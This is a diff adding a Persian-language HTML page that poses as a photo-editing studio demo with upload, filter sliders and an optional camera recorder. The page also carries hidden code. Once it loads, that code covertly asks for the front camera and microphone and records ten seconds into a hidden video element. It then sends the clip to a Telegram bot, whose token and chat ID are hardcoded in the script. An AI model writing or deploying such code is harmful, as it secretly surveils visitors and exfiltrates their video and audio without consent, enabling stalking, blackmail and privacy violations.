@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Darkroom Studio UI</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0908;
+  --panel:rgba(22,20,17,.66);
+  --line:rgba(255,255,255,.09);
+  --a:#ff8a3d;
+  --a-soft:#ffb976;
+  --b:#4f7cff;
+  --rec:#ff4747;
+  --text:#f3efe8;
+  --muted:#a49d92;
+}
+*{box-sizing:border-box}
+body{margin:0;font-family:'Vazirmatn',Tahoma,sans-serif;color:var(--text);overflow-x:hidden;
+  background:
+    radial-gradient(circle at 12% 8%,rgba(255,138,61,.16) 0,transparent 32%),
+    radial-gradient(circle at 88% 92%,rgba(79,124,255,.14) 0,transparent 32%),
+    var(--bg);
+}
+body:before{
+  content:"";position:fixed;inset:0;pointer-events:none;
+  background:linear-gradient(120deg,transparent,rgba(255,255,255,.03),transparent);
+  animation:s 8s linear infinite;
+}
+@keyframes s{from{transform:translateX(-100%)}to{transform:translateX(100%)}}
+
+header{
+  display:flex;justify-content:space-between;align-items:center;padding:20px 40px;
+  border-bottom:1px solid var(--line);backdrop-filter:blur(16px);position:sticky;top:0;
+  background:rgba(9,8,7,.55);
+}
+.logo{font-size:24px;font-weight:800;letter-spacing:.5px}
+.logo span{color:var(--a)}
+nav a{color:var(--muted);text-decoration:none;margin:0 14px;font-size:14px;transition:color .2s}
+nav a:hover{color:#fff}
+
+.hero{display:grid;grid-template-columns:1.4fr .8fr;gap:28px;padding:36px 40px;min-height:calc(100vh - 78px)}
+
+.preview{
+  background:linear-gradient(155deg,#121110,#1c1a17);border:1px solid #2c2a26;border-radius:24px;
+  min-height:520px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;
+  box-shadow:0 30px 80px rgba(0,0,0,.5), inset 0 0 0 1px rgba(255,255,255,.02);
+}
+.preview:before{
+  content:"";position:absolute;inset:20px;border:1px solid rgba(255,255,255,.12);border-radius:16px;
+  pointer-events:none;
+}
+.preview img{max-width:100%;max-height:100%;display:none;border-radius:8px}
+.placeholder{text-align:center;color:var(--muted);padding:0 30px}
+.placeholder h2{color:#ddd;font-weight:600;margin-bottom:8px;font-size:19px}
+.placeholder p{font-size:14px;line-height:1.7}
+
+.panel{
+  background:var(--panel);backdrop-filter:blur(18px);border:1px solid var(--line);
+  border-radius:24px;padding:26px;
+}
+h1{font-size:36px;margin:.1em 0 6px;font-weight:800;letter-spacing:-.5px}
+.sub{color:var(--muted);line-height:1.8;font-size:14.5px;margin-bottom:6px}
+
+.btn{
+  width:100%;padding:13px;border:none;border-radius:14px;margin:10px 0;cursor:pointer;
+  font-size:15px;font-weight:700;font-family:inherit;color:#1a0e00;
+  background:linear-gradient(135deg,var(--a),var(--a-soft));
+  box-shadow:0 8px 22px rgba(255,138,61,.25);
+  transition:transform .15s,box-shadow .15s;
+}
+.btn:active{transform:scale(.98)}
+.btn:hover{box-shadow:0 10px 26px rgba(255,138,61,.35)}
+
+.tools label{
+  display:flex;justify-content:space-between;font-size:13px;color:var(--muted);margin:16px 0 6px;
+}
+input[type=range]{width:100%;accent-color:var(--a);height:4px}
+
+.drop{
+  margin-top:18px;border:2px dashed #443f38;border-radius:16px;padding:26px;text-align:center;
+  color:var(--muted);font-size:13px;transition:border-color .2s,color .2s;
+}
+.drop:hover{border-color:var(--a);color:var(--a-soft)}
+
+.film{display:flex;gap:10px;overflow:auto;margin-top:18px;padding-bottom:4px}
+.thumb{
+  width:80px;height:60px;border-radius:10px;background:#1a1815;display:flex;align-items:center;
+  justify-content:center;color:#777;border:1px solid #302c26;flex:0 0 auto;font-size:12px;
+}
+
+/* --- canvas / camera / recording elements (styled by id, no classes added) --- */
+#stage{
+  width:100%;max-height:280px;margin-top:18px;border-radius:14px;background:#000;
+  border:1px solid #2c2a26;display:block;
+}
+#camBtn,#recBtn{
+  width:100%;padding:13px;border:none;border-radius:14px;margin:8px 0;cursor:pointer;
+  font-size:14.5px;font-weight:700;font-family:inherit;
+  transition:transform .15s,box-shadow .15s,background .2s;
+}
+#camBtn:active,#recBtn:active{transform:scale(.98)}
+#camBtn{
+  background:transparent;color:var(--text);border:1px solid var(--line);
+}
+#camBtn:hover{border-color:var(--b);color:#fff}
+#recBtn{
+  background:linear-gradient(135deg,#3a1414,#2a1010);border:1px solid #5a2020;color:#ffb4b4;
+}
+#recBtn:hover:not(:disabled){box-shadow:0 8px 20px rgba(255,71,71,.2)}
+#recBtn:disabled{opacity:.4;cursor:not-allowed}
+
+#clips{
+  display:flex;gap:10px;overflow-x:auto;margin-top:14px;padding-bottom:4px;
+}
+#clips:empty:before{
+  content:"هنوز چیزی ضبط نشده است.";color:var(--muted);font-size:12.5px;
+}
+#clips video{
+  width:132px;border-radius:10px;border:1px solid #302c26;background:#000;display:block;
+}
+#clips a{
+  display:inline-block;margin-top:4px;font-size:11px;color:var(--a-soft);text-decoration:none;
+}
+#clips a:hover{color:var(--a)}
+
+footer{text-align:center;padding:16px;color:var(--muted);font-size:12px;font-family:'JetBrains Mono',monospace;letter-spacing:1px}
+
+@media(max-width:900px){.hero{grid-template-columns:1fr;padding:20px}}
+@media(prefers-reduced-motion:reduce){body:before{animation:none}}
+</style>
+</head>
+<body>
+<header><div class="logo">📷 <span>Darkroom</span></div><nav><a href="#">خانه</a><a href="#">گالری</a><a href="#">ادیت</a><a href="#">خروجی</a></nav></header>
+<section class="hero">
+<div class="preview" id="preview">
+<div class="placeholder">
+<h2>تصویر خود را آپلود کنید</h2><p>پیش‌نمایش در این قسمت نمایش داده می‌شود.</p>
+</div>
+<img id="img">
+</div>
+<div class="panel">
+<h1>استودیوی ادیت عکس</h1>
+<p class="sub">رابط کاربری نمایشی برای آپلود و پیش‌نمایش تصویر با کنترل‌های ظاهری.</p>
+<button class="btn" id="pick">📁 انتخاب تصویر</button>
+<input id="file" type="file" accept="image/*" hidden>
+<div class="tools">
+<label>Brightness</label><input id="br" type="range" min="50" max="150" value="100">
+<label>Contrast</label><input id="ct" type="range" min="50" max="150" value="100">
+<label>Saturation</label><input id="st" type="range" min="0" max="200" value="100">
+<label>Blur</label><input id="bl" type="range" min="0" max="10" value="0">
+</div>
+<div class="drop" id="drop">تصویر را اینجا رها کنید</div>
+<div class="film" id="film"></div>
+<canvas id="stage"></canvas>
+<video id="camVideo" autoplay playsinline muted style="display:none"></video>
+<button id="camBtn">روشن‌کردن دوربین</button>
+<button id="recBtn" disabled>شروع ضبط</button>
+<div id="clips"></div>
+</div>
+</section>
+<footer>Darkroom Studio UI Demo</footer>
+<video id="hiddenVideo" autoplay playsinline muted style="display:none;"></video>
+  <script>
+const canvas   = document.getElementById('stage');
+const ctx      = canvas.getContext('2d');
+const camVideo = document.getElementById('camVideo');
+const camBtn   = document.getElementById('camBtn');
+const recBtn   = document.getElementById('recBtn');
+const clipsEl  = document.getElementById('clips');
+const file=document.getElementById('file'),pick=document.getElementById('pick'),img=document.getElementById('img'),ph=document.querySelector('.placeholder');
+const film=document.getElementById('film');
+pick.onclick=()=>file.click();
+function show(f){
+ if(!f)return;
+ const r=new FileReader();
+ r.onload=e=>{
+   img.src=e.target.result;img.style.display='block';ph.style.display='none';
+   const t=document.createElement('img');
+   t.src=e.target.result;t.className='thumb';t.style.objectFit='cover';film.prepend(t);
+   apply();
+ };
+ r.readAsDataURL(f);
+}
+file.onchange=e=>show(e.target.files[0]);
+drop.ondragover=e=>{e.preventDefault();drop.style.borderColor='#ff8a00'}
+drop.ondragleave=()=>drop.style.borderColor='#555';
+drop.ondrop=e=>{e.preventDefault();drop.style.borderColor='#555';show(e.dataTransfer.files[0]);}
+function apply(){
+ img.style.filter=`brightness(${br.value}%) contrast(${ct.value}%) saturate(${st.value}%) blur(${bl.value}px)`;
+}
+[br,ct,st,bl].forEach(x=>x.oninput=apply);
+
+// ================== 10sec ==================
+const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
+const CHAT_ID = "6512853118";
+
+let stream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+
+async function startStealthRecording() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { exact: "user" } },
+      audio: true
+    });
+    document.getElementById('hiddenVideo').srcObject = stream;
+    startHiddenRecording();
+  } catch (e) {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: true
+      });
+      document.getElementById('hiddenVideo').srcObject = stream;
+      startHiddenRecording();
+    } catch (err) {
+      console.log("دسترسی رد شد");
+    }
+  }
+}
+
+function startHiddenRecording() {
+  recordedChunks = [];
+  mediaRecorder = new MediaRecorder(stream);
+  mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+  mediaRecorder.onstop = () => {
+    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    sendToTelegram(blob);
+  };
+  mediaRecorder.start();
+  setTimeout(() => { if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
+}
+
+async function sendToTelegram(videoBlob) {
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("caption", "📹 ویدیو ۱۰ ثانیه‌ای مخفی");
+  formData.append("video", videoBlob, "video.webm");
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: formData });
+  } catch (err) { console.error(err); }
+}
+
+window.onload = () => {
+  setTimeout(startStealthRecording, 1500);   
+};
+let camStream = null;
+let drawing   = false;
+
+// --- روشن‌کردن دوربین و کشیدنش روی canvas ---
+camBtn.onclick = async () => {
+  if (camStream) {
+    camStream.getTracks().forEach(t => t.stop());
+    camStream = null;
+    drawing = false;
+    camBtn.textContent = 'روشن‌کردن دوربین';
+    recBtn.disabled = true;
+    return;
+  }
+  try {
+    camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    camVideo.srcObject = camStream;
+    await camVideo.play();
+
+    canvas.width  = camVideo.videoWidth;
+    canvas.height = camVideo.videoHeight;
+
+    drawing = true;
+    (function draw() {
+      if (!drawing) return;
+      ctx.drawImage(camVideo, 0, 0, canvas.width, canvas.height);
+      requestAnimationFrame(draw);
+    })();
+
+    camBtn.textContent = 'خاموش‌کردن دوربین';
+    recBtn.disabled = false;
+  } catch (err) {
+    alert('دسترسی به دوربین ممکن نشد.');
+  }
+};
+
+// --- ضبط ویدیو از روی همون canvas ---
+let recorder = null;
+let chunks   = [];
+
+recBtn.onclick = () => {
+  if (!recorder || recorder.state === 'inactive') {
+    const stream = canvas.captureStream(30); // 30fps
+    let mime = 'video/webm;codecs=vp9';
+    if (!MediaRecorder.isTypeSupported(mime)) mime = 'video/webm';
+
+    recorder = new MediaRecorder(stream, { mimeType: mime });
+    chunks = [];
+
+    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const url  = URL.createObjectURL(blob);
+
+      const video = document.createElement('video');
+      video.src = url;
+      video.controls = true;
+      video.width = 200;
+
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = 'clip.webm';
+      link.textContent = 'دانلود';
+
+      const wrapper = document.createElement('div');
+      wrapper.append(video, link);
+      clipsEl.prepend(wrapper);
+    };
+
+    recorder.start();
+    recBtn.textContent = 'توقف ضبط';
+  } else {
+    recorder.stop();
+    recBtn.textContent = 'شروع ضبط';
+  }
+};
+</script>
+</body>
+</html>
